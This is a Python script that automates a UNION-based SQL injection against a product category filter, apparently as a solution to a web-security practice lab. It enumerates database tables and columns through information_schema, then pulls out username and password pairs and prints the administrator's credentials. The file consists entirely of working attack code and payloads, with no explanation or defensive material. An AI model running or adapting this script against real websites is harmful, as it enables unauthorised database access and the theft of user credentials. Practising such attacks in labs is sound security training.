import requests
import urllib3
import sys
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def perform_request(url, sql_payload):
    path = "/filter?category=Corporate+gifts"
    req = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return req.text

def sqli_users_table(url):
    sql_payload = "'+union+select+null,+table_name+from+information_schema.tables--+-"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string = re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False
    
def sqli_users_columns(url, users_table):
    sql_payload = "'+union+select+null,+column_name+from+information_schema.columns+where+table_name+='%s'--+-" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string = re.compile('.*username.*'))
    password_column = soup.find(string = re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "'+union+select+null,+%s+||+':'+||%s+from+%s--+-" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(string = re.compile('.*administrator:.*'))
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for a users table")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" %users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" %username_column)
            print("Found the password column name: %s" %password_column)

            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator credentials are: %s" % admin_password)
            else:
                print("[-] Did not find administrator password")
        else:
            print("Did not find the username and/or the password columns.")
    else:
        print("Did not find a users table")
